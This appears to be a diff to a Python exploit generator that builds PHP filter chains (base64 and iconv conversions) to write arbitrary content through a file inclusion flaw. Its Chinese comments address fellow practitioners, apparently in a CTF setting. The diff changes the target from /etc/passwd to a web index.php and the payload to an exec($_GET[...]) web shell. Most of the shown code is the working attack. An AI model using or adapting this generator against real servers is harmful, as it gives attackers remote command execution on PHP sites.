@@ -2,11 +2,12 @@ import base64
 from dictionary import dictionary
 
 # set your parameter
-file_to_use = "/etc/passwd"
-str_to_gerenate = "<?php eval($_GET[1]);?>a"
+file_to_use = "/var/www/html/public/index.php"
+str_to_gerenate = "<aaaaaaaaaaaaaaaaaaaaaaaaaa<?=exec($_GET[`printf x`]);?>a"
 
 # generate some garbage base64 这里会在payload后面加一串\x1b$)C垃圾字符x 个人感觉好像也可以不加x 看各位师傅对这个的理解吧（
-filters = "convert.iconv.UTF8.CSISO2022KR|"
+filters = "convert.base64-encode|"
+filters += "convert.iconv.UTF8.CSISO2022KR|"
 filters += "convert.base64-encode|"
 filters += "convert.iconv.UTF8.UTF7|" # get rid of equal signs
 
@@ -41,14 +42,14 @@ def generatorByCustomDic(base64_payload,filters):
     for c in base64_payload[::-1]:
         filters += dictionary[c] + "|"
         print("[+] use "+ c + " : " +dictionary[c])
-        
-        filters += "convert.base64-decode|" 
+
+        filters += "convert.base64-decode|"
         filters += "convert.base64-encode|"
-        filters += "convert.iconv.UTF8.UTF7|" 
+        filters += "convert.iconv.UTF8.UTF7|"
 
     final_payload = getFinalPayload(filters)
     getTestPayload(final_payload)
-    
+
 
 def starGenerator(str_to_gerenate,filters):
     base64_payload = str(base64.b64encode(str_to_gerenate.encode()).decode())
